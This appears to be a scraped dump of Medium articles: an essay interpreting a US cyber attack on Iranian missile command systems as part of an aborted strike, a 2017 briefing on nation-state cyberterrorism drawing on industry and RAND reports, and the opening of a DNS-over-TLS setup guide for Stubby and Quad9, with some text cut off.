The US used a cyber attack that gained them nothing, and the Iranians pay a small price to learn how to mitigate and respond to such a cyber attack. The US taught Iran a lesson alright, but I very much doubt it was: “if you like your military toys, then leave the US alone.”
The rationale that the cyber attacks against Iranian C&C infrastructure were a punishment and a signal to Iran makes no sense . Like in the analogy, someone suffers a bit of inconvenience or some money while fixing things. For Iran this is a massive win. They learn: of a vulnerability in their C&C infrastructure that needs to be secured, and the practical experience of recovering from a cyber attack, particularly one against their C&C.
Iran pays next to nothing to learn how to better secure themselves against US cyber attacks. They also learn US CYBERCOM TTP – how they operate. And, bonus points, they learn the US doctrinal thinking on how cyber domain operations are incorporated into kinetic warfare operations. (Ok we all learn this, and it’s very similar to the Israeli doctrine of using cyber to disable opposition defense capabilities prior to an attack, e.g. disabling SAMs.)
There is no rational explanation for exposing a fragile but critical force protection capability – risking its future utility – in exchange for nothing of value. The official narrative is either false, or a demonstration of a terrible understanding of conflict in the cyber domain.
The only plausible reason why US CYBERCOM launched a damaging denial of service attack against Iranian missile C&C assets is that it occurred before the rest of the operation was aborted. If the cyber attack was an early mission to prepare for the later kinetic operation it may have executed before the rest of the operation was aborted. Most likely the cyber attack was to temporarily reduce Iranian military capacity. The goal being to limit the threat of immediate escalation (“you and what missile fleet? lol“) plus provide force protection for the kinetic attack that would more permanently reduce Iran’s military capacity. A simple time line easily shows how this could happen.
The very nature of loud offensive cyber attacks makes them inherently less repeatable in the future. Destroying Iranian missile C&C assets via cyber has a cost. That cost must be offset by some value achieved by exploiting results of using that cyber capability. Diplomatic, strategic, operational or tactical, there must be follow up exploitation of a successful cyber attack.
Aborting the kinetic element of the operation after the cyber offensive had already begun is the only rational explanation I can think of for such irrational behaviour.
Destroying Iranian missile C&C assets via cyber has a cost. That cost must be offset by some value achieved from exploitation of the results of that cyber capability. Diplomatic, strategic, operational or tactical, there must be follow up exploitation of a successful cyber attack.
The cyber domain has very rapid evolutionary cycles for offence and defense capability. One of the most important elements driving each iteration is the feedback register, which helps refine the fitness function, and triggers the start of a new cycle. Feedback information is a vital part of cyber warfare. Feedback determines how rapidly evolution advances, and which areas are important for selection in the next cycle. Fast reliable accurate feedback is possibly the strongest cyber defense capability (which is a whole other discussion, but seriously— cyber deception, done correctly, is magic.)
The rapid evolutionary cycle of the methods and means of warfare in the cyber domain is driven by information from successful attacks or defence. Clearly the best strategy for a cyber threat actor who wishes to retain a capability for future use is cautious selective utilisation. A rational actor uses tools only when they need them not just because they have them.
A rational actor uses tools only when they need them not just because they have them.
The US had planes in the air ready to attack a number of Iranian military targets. The attack was aborted 10 minutes before it executed, and the sites were not bombed. Bizarrely, US CYBERCOM immediately bragged about how they had caused significant operational damaged to the Iranian missile control system. The hack was framed as a retaliation signal to Iran “the US can shut down your systems, let this be a warning to you. This will be expensive to fix so you’re ‘paying’ for your lesson.”
Didn’t we just cover why using cyber capabilities without any follow up exploitation is a waste ? Using cyber tools means accepting the risk of losing those cyber tools.
The clandestine element of cyber operations means that many of the same rules restricting clandestine organisations’ operational capacity apply:
The increasing frequency of British army searches meant that the policy of IRA quartermasters was ‘the more you give, the more you lose.’ Therefore, highly prized weapons, like Armalites, were kept for important operations. — source: Insider, Gerry Bradley’s life in the IRA
I sincerely hope that CYBERCOM is merely making a face-saving false statement, rather than enacting a policy that demonstrates a fundamentally flawed understanding of conflict in the cyber domain.
For the sake of argument let us assume that CYBERCOM is not a clown show cyber warfare unit that believe they are literally “dropping cyber bombs.” What rational reason(s) could there be for the execution of a (probably single use) temporary crippling cyber attack? Here’s one plausible reason: the cyber attack was a preparatory phase of an operation that would center around kinetic attacks on military targets. The preparatory phase was already past the point of no return by the time the operation was aborted.
This can even explain why the damage was more extensive than strictly necessary for the original mission (if indeed that is the case.) If cyber domain operations weren’t aborted in time, since they were already committed they were allowed to finish, or even expanded in scope? Once we assume the hypothesis that CYBERCOM began their mission before the abort, any other similar cyber domain operations around that time can be attributed to them as well because: In for a penny, in for a pound.
I will create a fake, crude, and clumsy mission plan. with unrealistic times and details so the salient points are easily visible.
The primary mission objective of this operation is for Orangia to destroy some military targets located inside Iranistan. Orangia has superior technology and air supremacy, but are very casualty sensitive. Iranistan has good technology, particularly for threatening Orangia’s regional allies, Orangia’s economic partners, and Orangia’s air assets.
Blue Team: Iranistan
Iranistan has an advanced military with large stockpiles of sophisticated ballistic missiles, a powerful anti aircraft defense system of radars and surface to air missile batteries. They’re keyed up for a war and almost any attack, particularly kinetic, will trigger a cascade of escalations which are in nobody’s best interest.
Red Team: Orangia
Orangia has the largest most technologically sophisticated military in the world, comprised of some of the best soldiers in the world. They are have some cultural quirks that impact their war fighting capacity though, for example taking casualties can frequently be enough to trigger political pressure on the leadership to halt or reduce military involvement. Casualty avoidance and military technology tend to push Orangia into air campaigns where air supremacy limits their risk exposure. The Orangia military is composed of several competing services who enjoy fractious political infighting. On the field though, these services operate in concert using “combined arms” doctrine where they all support each other.
The newest member to the military services club is the group tasked with conducting operations in the cyber domain. They have yet to prove themselves in conflict and are eager to do so.
The Orangia political leadership is extremely erratic and unpredictable. It is hard to interpret what signals they are attempting to send (they’re frequently at odds with each other and there is spirited debate about whether they are even literate in state level signalling.) If there’s a coherent doctrine or strategy being pursued by the often confused and confusing leadership no one has been able to articulate it yet. Inconsistent, unpredictable, erratic, and fickle, developing a strategy against Orangia is a challenging task.
Prior performance is no guarantee of future performance.
Iranistan is protected by the credible threat of a large volume of diverse ballistic missiles. A wide radar perimeter allows them to detect incoming flights, and within that space a smaller zone represents the boundary of their anti aircraft missile capability. An air attack on Iranistan requires removing the ballistic missile threat and disabling their air defense systems.
The kinetic strike against the Iranistan military targets is schedule for 2200 (zero hour). Orangia military planners calculate the flight times of their attack air craft:
To strike their targets at 2200, the planes must take off by 2000, leave for their targets by 2030, at 2100 they penetrate the perimeter, at 2130 they reach the boundary, and at 2200 they strike.
Orangia’s doctrine of force protection requires that the military disable the air defense systems before the aircraft reach them, so the AA must be disabled by 2130. However, once the aircraft are inside the perimeter. (2100) the chance that Iranistan will execute on their threat to Orangia’s regional allies starts to rise dramatically. To be safe, Orangia should neutralise the perimeter radar before the aircraft reach it, and they should also disable the AA at the same time to prevent last minute security procedures hardening the AA systems. Really, Orangia needs to launch all of it’s cyber domain operations as close to 2100, as they can get without being premature.
That is the only way I can think of to explain the insane behaviour of US CYBERCOM as the behaviour of a rational actor.
Written by
","['Cybersecurity', 'Operational Security', 'Cyber Warfare', 'Information Security']"
"Prevailing Gray Swans: The Clear and Present Danger List for the Week Ending January 13, 2017",https://medium.com/deepconnections/prevailing-gray-swans-4-august-19-2016-c2f2023ef72c?source=tag_archive---------9-----------------------,"[economics | finance | politics | sociology | military strategy |technology]
This intelligence briefing’s objective is to provide concrete evidence that cyberterrorism is a clear and present danger to all modernized societies and is a risk that is growing proportional to the rate of digital technological sophistication and proliferation.
Advances in technology and increases in system complexity spawn and leverage opportunities for future unpredictable vulnerabilities. Considering that 87% of the total value of the S&P 500 now consists of intellectual property (IP) and other intangibles and has been trending higher, during the last decade cybersecurity’s importance should have moved from afterthought to near the apex of awareness and priority. Unfortunately, the protection has woefully lagged for this highly-concentrated societal value that has quietly quintupled since 1975. The cost and risk to not judiciously act is steadily mounting and investment in robust cybersecurity now poses a value equation that mandates planning, resources, talent and urgency. For corporations and infrastructural entities to ignore the exposure and immanent repercussions of cyberterrorism is reckless and bears significant fiduciary responsibility for publicly-held companies and is not limited to economic concerns — public safety and societal well-being is at stake as well.
This document is focused on known threats (cyberterrorism/warfare) and countermeasures to those threats (cybersecurity) at the highest level that impact societal function; it does not address “virus protection” against petty cybercrime for discrete, low-value targets.
To demonstrate the immediacy of some classes of threats see the Norse and Arbor Networks links (these graphs only show overt attacks, many critical security breeches “fly under the radar” and are not discovered for months):
Norse real-time global threat monitoring | Arbor Networks + Google Maps — (denial of service (DDoS) Digital Attack Map)
[ Cyber attack statistics ]
Finding top-tier, relevant sources for this topic was surprisingly problematic — most is superficial, overdramatized, politically-colored, speculative, or obsolete and, thus, useless for the intent of this briefing. Cyberterrorism and cybersecurity is a rapidly moving battlespace where the most informed experts are in specialized private companies that work in coordination with many aspects of law enforcement and military or are government agencies and specialized military functions. Since detailed government/military sources are classified, many sources for this intelligence briefing were derived from cybersecurity conferences and white papers from the cybersecurity industry* including detailed case studies outlining the process of the extraordinary dynamics and complexity of detecting and combating cyberthreats on infrastructural targets that undergird modern societal function on a global scale.
In business, time is money. In globalized, hyper-competitive environments, getting your product or service to market fast or even too fast (meaning we will fix bugs after the customers discover them) is imperative and is incentivized as such. That being the case, by default, cybersecurity is treated as an accessory and, in effect, becomes a marginalized, outsourced risk: “we’ll do it later.”
From a legal perspective, cyberterrorism, given its economic and existential costs, is a rapidly emerging issue along with its extension — public policy and international law**. Policy lags law while law lags technological advances tied-at-the-hip to its dark flip-side: the advent of new and improved unimaginable harm via weaponized computer code. So this predicament going forward, which is not likely to change because law is a legacy process steeped in inertia, is such that the tandem of technology and harm moves fleetly while law and policy crawls — five years is an eternity and the consequences are grave. Merely ascertaining culpability (legal proof of attribution) is often impossible while assessment of after-the-fact, bottom-line, hard-and-soft costs and incident rate proliferate and stockpile. So the assailant gets away with it but isn’t the corporation liable for negligence given that there is enough precedence to enact and stiffly enforce new laws with radically higher standards imposing serious teeth? The closure of this feedback loop will be a boon to the cybersecurity industry and a wakeup call to corporate boardrooms and a re-defining of their priorities should the threat of data loss, revenue, fines, and goodwill be insufficient to sound the alarm.
Insurance and Legal Trends
Insurance and legal functions are catching up and are being driven by both the extent of companies attacked and also the costs in the aftermath which can be staggering, on the scale of major natural disasters:
Company bosses have been accused of complacency after it was revealed that nine in 10 big businesses have suffered a significant cyber attack in the past five years, but less than half are concerned about suffering a future breach. The 328-year-old Lloyd’s insurance market has been forced to change tack by focusing on underwriting cyber risks and away from more “traditional” threats like fires, earthquakes and terror attacks. “We used to think, ‘what if an office is flooded or if there’s a great big fire?’,” said Ms Beale, who was appointed [at Lloyd’s] in 2014 after heading insurer Canopius. “But now we need to work out how to assess the damage from a cyber attack, including the harm to reputation and costs of getting the business up and running again.” However, under new rules EU companies will face fines of up €20 million, or 4pc of their global annual turnover, if they fail to protect data properly, when the General Data Protection Regulation takes effect from 2018.
(Source: The Telegraph, Kate Palmer, September 17, 2016, “Nine of 10 big business have suffered a major cyber attack as Lloyd’s of London chief says firms are ‘complacent’”)
Technically, the internet (i.e. the hardware communications backbone) and the software “world wide web” built on top of it were never envisioned as a global information highway so security was not an integral, high-priority design consideration; in fact, in the 1970s, it was no consideration at all. Malware, trojan horses, worms, viruses, encrypted passwords, cyberwarfare…really?
Mission creep from the original design and scope of the internet to what it has become and where it is going (e.g. smart anything coming soon (“Internet of Things”, robots, drones, self-driving cars…) is going to morph into vulnerable everything later) has come to roost as an incubator of a never-ending pipeline of forthcoming, expensive Achilles heels. The cost to society of cyberterrorism to date is only the tip of the iceberg: the dynamic between cyberterrorism and cybersecurity precisely mirrors the classic Red Queen predator-prey ecosystem dynamic in evolutionary biology. The Red Queen hypothesis published in 1973 — coincidently drafted at the same time as ARPANET — has suddenly found new application in the neoteric cyber-ecosystem:
We can think of the Red Queen Hypothesis in terms of an unorthodox game theory. To a good approximation, each species is part of a zero-sum game against other species. Which adversary is most important for a species may vary from time to time, and for some or even most species no one adversary may ever be paramount. Furthermore, no species can ever win, and new adversaries grinningly replace the losers. This is a direction of generalization of game theory which I think has not been explored.
From this overlook we see dynamic equilibria on an immense scale, determining much of the course of evolution by their self-perpetuating fluctuations. This is a novel way of looking at the world, one with which I am not yet comfortable. But I have not yet found evidence against it, and it does make visible new paths and it may even approach reality. [Note: Emphasis mine (J.A.)]
(Source: The University of Chicago, Department of Biology, (Van Valen), Vol. 1, No. 1. p. 21, (1973), “A New Evolutionary Law”) (pdf))
Compounding the Red Queen problem, human perception at the biological level is a formidable, innate barrier to reversing this trend: our perception of loss is grounded in physical threats (is that a saber-tooth tiger behind that tree?) hardwired to our survival whereas threats in cyberspace are both intangible and abstruse, ergo, are very hard to comprehend, value, and effectively act upon — there is a disconnect between our sense of endangerment (i.e. no limbic system-triggered panic or fight-or-flight fireworks) and a proportional response. So, the legal disconnect, the biological disconnect, and the Red Queen problem are structural issues that will never go away which places an incredible burden on the only remedy: the ability to communicate and educate the nature and scale of abstract, clandestine threats that cause real-world devastating aftermaths greater than an ambush of famished saber-tooth tigers. This intelligence bulletin is composed with that tall task in mind.
Understand: the calculus of cost of design and ownership of information systems, cradle-to-grave, from both a company’s and their customers’ perspective, will be in a state of flux sooner rather than later. Cybersecurity is no longer an accessory — it should now be front-and-center and instrumental to all reputations involved and will become a driver in net profitability for product/service performance metrics and will be a new directive that influences a company’s brand value. Customers — both businesses and consumers — will become cognizant of the essentiality and features of state-of-the-art cybersecurity measures which will translate to a mandatory check-box on the short list. This cognizance will manifest from either, hopefully, insight or, unfortunately, hindsight. The rules of the game have changed and institutionalizing cybersecurity will soon be intuited as a first-mover, strategic advantage to leapfrog the industry totem in lieu of tactically being first to market with the next product cycle — the tortoise will steamroll the hare. This shift from tactical to strategic thinking will happen as more people and organizations learn that abstract threats in cyberspace have consequences even more crippling than primeval, visceral threats. All first-tier military forces know this; cyberspace has become the fifth dimension of modern warfare: land, air, sea, space, and now cyberspace. And that is up next.
In today’s world, state-of-the-art cyberterrorism is created and funded by multiple operators at the nation-state level executed either by a specialized branch(s) of the state’s military or anonymously channeled through proxies and can only be combated by very sophisticated cybersecurity firms that must perform like seasoned, cardiac surgery teams. Just like in the real-world you have Virus Hunters of the CDC (Center for Disease Control) hunting the Ebola virus and Lassa fever, in cyberspace there are virus hunters too. At the cutting edge, this is the way you need to visualize it: there are teams of specialists from artificial intelligence (AI), manifold software sub-disciplines all the way down to “at the metal” or root-level machine language, hardware, networks and communication protocols and, with growing frequency, old-school intelligence officers addressing espionage and/or sabotage — all of which must orchestrate harmoniously. Simply: forensic and hunting skills on multiple levels are teamed with experts in many technical disciplines and they have to perform on the clock and in sync.
As the adversaries’ tactics, techniques, and procedures (TTPs) change, so must the defenders’ approach; just as a biological immune system’s antibodies continuously evolve in lockstep with bacterial mutation, so does a cyberterrorist’s tradecraft. New species of threats emerge behind the shadows at any time. This is a very fluid dynamic; you cannot fight today’s war with yesterday’s weapons and tactics, it is a well camouflaged moving target. And it is rapid change that makes any prediction treacherous and borderline foolhardy; just like predicting a hurricane’s path 5 days out is much less certain than 2 days out, this same concept of a cone of uncertainty is front-and-center in cyberterrorism. From the C-suite perspective, it is never going to be a problem that is “handled”, the Red Queen is alive and well, locked and loaded. Only great “employee hygiene” of network access, incessant vigilance, state-of-the-art tools, and 24/7 learning are viable countermeasures.
Next, watch the short video Stuxnet: Anatomy of a Computer Virus. Following the video is a briefing on the major cyberwarfare nation-state programs.
There are five countries that have well-documented and formidable offensive cyberwarfare capabilities: the United States, Russia, China, Iran, and North Korea. Understand that there are many other countries invested in cyberweapon development along with thousands of small to medium non-state actor groups and networks and tens of thousands more “hacktivists wearing black hoodies with a laptop at Starbucks.” Very powerful weaponized malware is available through open source along with tutorials on how to build your own lethal cyberweapon. What is in the public domain today is more powerful than what was a state-of-the-art, top-secret, skunkworks cyberweapon in yesteryear.
China
For an overview of China’s major targets, see this infographic:
Infographic of China’s Threat to Multiple Global Vertical Business Sectors (CrowdStrike) (2015) (pdf)
China’s capabilities: [ The Rand Corporation, 2015, The US-CHINA Military Scorecard: Forces, Geography and the Evolving Balance of Power 1996–2017, pp. 259–284 (pdf) | Jamestown Foundation | Washington Free Beacon | The Diplomat | Tri Pro Sec (pdf) ]
A recent example of China’s offensive capabilities:
The first of the breaches attributed to China-based actors was announced by healthcare provider Anthem in February 2015; it reportedly resulted in the acquisition of customer names, Social Security numbers, physical and email addresses, and income data for between 37.5 and 78.8 million customers. Two other U.S. healthcare providers, Premera and CareFirst (both under the BlueCross/BlueShield umbrella along with Anthem), followed suit in March and May, respectively. Premera reported a PII (ed. “personally identifiable information”) breach of up to 11 million of its customers, while CareFirst put the number around 1.1 million. All told, these healthcare breaches resulted in the compromise of anywhere from approximately 50 to 80 million Americans.
(Source: CrowdStrike 2015 Global Threat Report, p. 7 (register to download (pdf))
A snapshot of the Chinese philosophy of cyberwarfare and its asymmetric nature between offense and defense — defense is very difficult to flawlessly execute 24/7:
Although Chinese authors emphasize the importance of defense, they also see cyber warfare as inherently offense-dominant:
“Networks in integrated-whole terms have the features of susceptibility to attack and difficulty of defense, and this asymmetric quality of network attack and network defense is prominent.” [from 战略学 (The Science of Military Strategy), 3rd ed., 2013, pp. 192–193]
(Source: The Rand Corporation, 2015, Scorecard 9: U.S. and Chinese Cyberwarfare Capabilities, (p. 273) (pdf))
As supply chains become more complex, another weakness to exploit is computer hardware manufactured in China (or elsewhere) that can have malware designed into the hardware (firmware) itself and is then sold to military and civilian customers in the US. “Malware Inside” is not far-fetched speculative theory, either. When malware is “baked in the cake” it takes cybersecurity to a different level:
The Chinese could manufacture a corrupted device and find some way of getting it purchased and inserted into the SIPRNet [ed. Secure Internet Protocol Router Network]. When triggered, the device would carry out instructions designed to corrupt or disrupt SIPRNet operations. Concern about this possibility within the cyber defense community has resulted in increased scrutiny of DoD purchases.
and in footnote 12 on the same page:
In early July 2011, Greg Shaffer, acting Deputy Under Secretary of Homeland Security, was asked whether any software or hardware components embedded with security risks had been installed. He replied, “I am aware that there have been instances where that has happened.”
(Source: The Rand Corporation, 2015, Scorecard 9: U.S. and Chinese Cyberwarfare Capabilities, (p. 265) (pdf))
More from the National Security Cyberspace Institute, 2011, “Software (In-)Security”, (pdf)
Iran
Iran’s capabilities: [ U.S. Army War College | Washington Free Beacon|Foreign Affairs ]
After the use of Stuxnet on Iran, Iran effectively retaliated with “Operation Cleaver”. The report on how Iran stole thousands of credentials of key personnel and data in many industries is documented in this video and is well worth watching in order to quell erroneous pre-conceived notions of cyberterrorism and cybersecurity. Find out what it realistically means to be at the edge of the performance envelope in this discipline:
In-depth background report for this video: Iran’s Operation Clever (Cylance)
A continuation on the train of thought of sophisticated cybersecurity in action in the real-world is Cylance’s efforts on large scale attacks on Japan’s infrastructure from 2010 to 2016:
The group has already compromised a wide breadth of victims across the following industry verticals: electricity generation, oil and natural gas, finance, transportation, and construction. SPEAR’s current research indicates the group’s present focus has shifted to specifically and exclusively target Japanese companies or Japanese subdivisions of larger foreign organizations, including a major Japanese oil and gas company, a Japanese subsidiary of a South Korean electric utility, and a major Japanese automaker.
(Source: Cylance: Operation Duststorm)
To be clear, these attacks are not in reference to Iran; the attacker(s) is not referenced.
Infographic of the Timeline of the Japanese attacks
Russia
Russia’s capabilities: [ Militaire Spectator 2016 | Defense Tech | RSA Conference Europe 2013, William Hagestad II, Comparative Study between China, Russia and Iran (pdf) ]
Application of Russian cyberwarfare in the Ukraine:
Much of the clandestine cyber conflict in Ukraine focused on directing public sentiment through the application of pressure to centers of gravity. Some of those centers of gravity have been broadly identified through current targeting actions as the military, energy sectors, media, government, and and non-governmental organizations. Looking specifically at the critical infrastructure center of gravity, it is easy to identify a persistent pattern in targeting within the energy sector. The Ukrainian energy sector was targeted as early as May 2014 when BlackEnergy malware was discovered on power company networks.
The totality of these events, from May to the present, exemplifies how hybrid conflicts are conducted across the physical and information battlespace, also referred to as “the fifth domain”. A force able to cause physical effects by leveraging the fifth domain is a force to be reckoned with.
(Source: CrowdStrike 2015 Global Threat Report, pp. 27–28 (register to download (pdf))
North Korea
North Korea’s capabilities: [ Center for Strategic & International Studies | University of Washington (Jackson School of International Studies)| U.S. Naval Postgraduate School | Security Affairs ]
Recent North Korean cyber attacks show that only understanding North Korea in light of its conventional military confrontations with democratic countries is outdated. The characteristics of cyberspace and cyber warfare have allowed North Korea to pay more attention to developing and exerting its cyber capabilities. In other words, North Korea benefits from the low cost of entry, anonymity, and the plausible deniability that cyberspace offers. At the same time, the international community has not monitored the development of North Korea cyber capability and it has not imposed any sanctions against North Korea for its cyber activities. This is largely due to the difficulty attributing attacks to North Korea. North Korea’s successful cyber strategy indicates that it can achieve its strategy pillars without a threat of increased economic sanctions through developing its cyber capabilities, instead of solely focusing on the conventional weapons.
(Source: Donghui Park, University of Washington, June 28, 2016, “North Korea Cyber Attacks: A New Asymmetrical Military Strategy”)
From 2013–2015, the Director of National Intelligence named the cyber threat as the number one strategic threat to the United States, placing it ahead of terrorism for the first time since the attacks of September 11, 2001. Potential state and non-state adversaries conduct malicious cyber activities against U.S. interests globally and in a manner intended to test the limits of what the United States and the international community will tolerate. Actors may penetrate U.S. networks and systems for a variety of reasons, such as to steal intellectual property, disrupt an organization’s operations for activist purposes, or to conduct disruptive and destructive attacks to achieve military objectives.
Potential adversaries have invested significantly in cyber as it provides them with a viable, plausibly deniable capability to target the U.S. homeland and damage U.S. interests. Russia and China have developed advanced cyber capabilities and strategies. Russian actors are stealthy in their cyber tradecraft and their intentions are sometimes difficult to discern. China steals intellectual property (IP) from global businesses to benefit Chinese companies and undercut U.S. competitiveness. While Iran and North Korea have less developed cyber capabilities, they have displayed an overt level of hostile intent towards the United States and U.S. interests in cyberspace.
(Source: Department of Defense Cyber Strategy, April 2015, “II. Strategic Contexts”, p.9, (pdf))
Relevant background:
CBS 60 Minutes segment on North Korea’s cyber attack on Sony
Sunday Guardian (India): North Korea expands cyberterrorism forces to 5900
Modern computers and their networks impose an inherent, Siamese twins relationship between functionality and vulnerability:
First, the challenges in implementing effective cybersecurity are technical and involve attributes of systems that are integral to their design. Modern military systems (and information technology systems) are so complex that only specialists can understand the detailed operations of the protocols, identify critical vulnerabilities, and understand how to address these vulnerabilities without compromising functionality. Many of these details are specific to each military system, and therefore the technical knowledge is confined to a very limited number of experts.
Second, functionality and cybersecurity are intertwined. Quite a number of cyber vulnerabilities are the result of features deliberately designed into systems. That is not to say that engineers aim to make vulnerable systems, but during design, engineers make trades between functionality and security and are willing to accept certain levels of vulnerabilities in order to achieve some functionality, often knowingly, and sometimes unknowingly. One example is that desktop computer operating systems permit other computers to download and run executable code from World Wide Web sites. Much of the functionality of the World Wide Web comes from this ability, which allows for a powerful range of applications. But it also permits the loading of malware from malevolent actors. Much of the commercial world is so driven by introducing new functionality that security is a lesser priority, and, when addressed, security is introduced by overlays on an insecure design rather than by an inherently secure design.
(Source: RAND Corporation, 2015, Improving the Cybersecurity of US Air Force Military Systems Throughout Their Lifecycles, “Attributes of Cybersecurity That Inform How It Needs to Be Managed”, p. 6)
Modern, integrated supply chains harbor unique vulnerabilities:
Traditional security controls used in a layered security strategy have not fully protected transportation and logistics organizations and have proven to be static in their defense. They lack the adaptability to proactively defend against the speed and sophistication of new advanced malware, insider and zero-day threats, and the use of Tor and anonymous proxies to hide and anonymize malicious network activity.
(Source: Norse Corporation, 2014, “Reducing the Risk of Cyber Attacks to Transportation & Logistics Organizations with Live Attack Intelligence” (pdf))
“Computer system” cannot be restricted to purely digital environments for information processing and repositories for work-product and intellectual property. Recall how Stuxnet was able to destroy the Iranian centrifuges by taking over the automated mechanical and electrical systems that control the nuclear reactor. These are called industrial control systems (ICS) and they are everywhere in modern societies because of the improved reliability and reduced costs from automation and automation means software and software has a fluorescent red dot on its back — ICS-specific attacks are a relatively soft target due to neglect because they are not considered “cyber” and are a major objective of cyberterrorism and cyberwarfare at the state-of-the-art level of the offensive-mindset.
The trust levels of Level 2 workstations and servers are lower than controller-level and field devices for three reasons:
They run commercial operating systems and software (e.g., SQL database software) with vulnerabilities that are continuously being discovered and exploited.
They have a better chance of being infected or compromised, because they can be accessed by Level 3.
They have users who may not always follow policies and procedures — some may plug in nonverified USB sticks, plug in their smartphones to charge, or bring in their own software that has not been tested to operate correctly with the ICS.
The trust levels associated with field devices, controller-level devices, and workstations are inherent to most control systems. Understanding them and maintaining separation/isolation between them is a responsibility that is normally not present in IT systems.
(Source: International Society of Automation, Lee Neitzel and Bob Huba, 2014, “Top ten differences between ICS and IT cybersecurity”)
Attacks of this nature are going hockey stick:
Legacy computer hardware and software architectures like Intel x86 chip sets and the Microsoft Windows operating system kernel were never intended for today’s networked world. Also, the recent trend of virtual machine architectures that are becoming extremely popular is a new vulnerability opportunity:
Over the years, an arms race has been raging between system designers and researchers driving down to the silicon chips that support the boot process, exposing previously unknown flaws in software that we rely on every day. This leads to enhanced protections, and in some cases, wily attackers can use the flaws to compromise systems at a very low level.
Virtual Machine computing is another area of intense research. In the last year, it became apparent here, too, that low-level drivers and code to support antiquated devices could diminish the security of the overall system. With these research stories slowly percolating into the mainstream media, it is important to keep an eye on novel research that may lead to critical exposures in the future.
(Source: CrowdStrike 2015 Global Threat Report, p. 72 (register to download (pdf))
Data breeches and IP theft, because they are asymptomatic, can persist for a long time before discovery, if they are discovered at all:
Numbers always tell a story, but it’s the interpretation of those numbers that holds the real value. The median number of days an organization was compromised in 2015 before the organization discovered the breach (or was notified about the breach) was 146. This continues a positive improvement since we first measured 416 days in 2012. Additionally, the median number was 205 days in 2014, which means we witnessed a drop of more than 50 days in 2015! Obviously, as an industry, we are getting better at detecting breaches.
(Source: Mandiant Consulting (FireEye, Inc.), February 2016, M-Trends 2016, p.4 (register to download (pdf))
Back-of-the-napkin calculation shows significant cost saving by outsourcing IT to the cloud; everyone is doing it from two-person startups to Fortune 500 companies — why not? However, the sea-change migration to the cloud has created new vulnerabilities that have proven difficult to detect. It is not that cloud computing is necessarily worse than keeping IT “in-house”, it is that securing your intellectual property and work-product is outsourced along with your data so that a new level of coordination, implementation, and validation of security is in order and owning the responsibility is currently not up to the task:
The most damaging outsourced service provider abuses we saw this past year were related to the IT outsourcing (ITO) industry. By working with victim organizations and their outsourced IT service providers, we have identified multiple advanced attack groups that have persisted across various ITO infrastructures for more than at least two years — and five years in one instance. The attackers were maintaining persistence to the ITOs and leveraging them for unrestrained access into the targeted companies that employ the outsourced services. The goals of the attackers varied for each of the end client victims, but the actors were primarily focused on stealing sensitive data from those organizations while maintaining access to the ITO infrastructure for additional campaigns targeting other companies.
(Source: Mandiant Consulting (FireEye, Inc.), February 2016, M-Trends 2016, p.24 (register to download (pdf))
In the cloud, how sure are you that your IP is safe? At the present time, this is a question that cannot be answered with any acceptable degree of confidence — either technically or legally — simply because it is unknown. The much more haunting, perplexing question is: is it knowable, ever? The Red Queen problem comes to roost here as a permanent, intractable fixture: the combination of technology, complexity, and the sum of human plus machinic cognitive powers is akin to a mirage that topologically features fatter and longer tails over time — it harbors hidden risks that elude identification, quantification and neutralization. The fact of the matter is that no matter how much “somebody” (machine + human) knows or claims to know, the knowable + unknowable is always a superset of that and — most critically — the Red Queen’s niche exists at the extreme margin of the knowable, perpetually just out of the desperate grasp of the most competent defensive measures. All that can ever be done is to deploy the best defense possible, there is no such thing as “good enough.” Arriving at an accurate measure or even definition of “cost effective” is a slippery slope at best.
Cyberterrorism and cybersecurity is a very fluid battlespace. Finding credible information that provides an infallible assessment on the vulnerability of the US power grid is not available and quite possibly is unknown because of unknown unknowns for all parties involved — offensively or defensively. The video provides a conversation between Richard Ward, Senior Manager of National Security Policy for the Edison Electric Institute and Norm Laudermilch, COO of Invincea, a cybersecurity firm:
Now the US military’s position:
“Yes, China and one or two others can shut down our power grids.”
Role of U.S. Cyber Command (NSA) in protecting 16 facets of critical infrastructure including the power grid, water, financial centers, and transportation.
Admiral Michael S. Rogers, U.S. Navy, Commander, U.S. Cyber Command, Director, National Security Agency/Chief, Central Security Service [Source: RSA Conference 2016, (video)] [Source of quote: Admiral Michael Rogers in Construction Week, 2015, re: Cylance]
Throughout this intelligence briefing an emphasis has been placed on the dynamics of the battlespace between offense and defense; this is the realm of the Red Queen problem which is always in flux and never gets old. As more technology and more complexity is released into the digital ecosystem, new parasites and predators emerge and enjoy a field day from t","['ABOUT ME', 'Cybersecurity', 'Security', 'Economics', 'Politics', 'Military Strategy']"
Privacy: Using DNS-over-TLS with the Quad9 DNS Service,https://medium.com/nlnetlabs/privacy-using-dns-over-tls-with-the-new-quad9-dns-service-1ff2d2b687c5?source=tag_archive---------5-----------------------,"Update 1 April 2018: Yes, this also works for Cloudflare’s #1dot1dot1dot1
Recently the Quad9 DNS service was launched, a collaboration between IBM, Packet Clearing House (PCH) and the Global Cyber Alliance (GCA). According to the GCA, the Quad9 DNS server clusters are load-balanced with dnsdist and use a mix of Unbound and PowerDNS servers to deliver responses, giving the whole service a special Dutch flavour ����.
Quad9 differentiates from similar services by focussing on ease-of-use, scalability, security and privacy. One interesting and seemingly undocumented feature is the fact that you can communicate with the service using DNS-over-TLS. This encrypts the communication between your client and the DNS server, safeguarding your privacy.
We can get this functionality working using GetDNS, a modern asynchronous DNS API that NLnet Labs contributes to. As GetDNS is a library, we need a stub resolver that can talk to it. Stubby is a local stub resolver daemon that links with GetDNS to make this work on your system. Stubby is available for Windows, macOS and Linux. In this demo I’ll be using a Mac, so the easiest way to get started is by installing Homebrew, if you don’t already have it.
Next, we can install Stubby.
Stubby relies on a configuration file in YAML (Yet Another Markup Language), open stubby.yml in /usr/local/etc/stubby/ in order to edit it.
By default you’ll see that GETDNS_TRANSPORT_TLS is the only transport protocol that is enabled. For this demo, we want to keep it this way to make sure that we only communicate over TLS and have no means to fall back to TCP or UDP. We also want the usage profile to be ‘Strict’. This means that authentication information for the upstreams must be specified in the configuration file. Look for the line tls_authentication and ensure it is set to GETDNS_AUTHENTICATION_REQUIRED.
A little bit further down you will find a list with upstream recursive name servers that Stubby will send queries to. Several test servers are being operated by organisations such as SURFnet, Go6Lab and NIC Chile. All of them have an IP address, a hostname for TLS authentication and a Base 64 encoded form of SPKI pin(s) for TLS authentication (RFC7858).
We can query for the current SPKI pin for Quad9, but as DNS-over-TLS is an undocumented feature and we don’t know what their policy is, keep in mind that the key may be rolled by at any time. You can always get the latest SPKI pin with this command.
It should return with a value like this.
Now we have all the required elements to edit the config file.
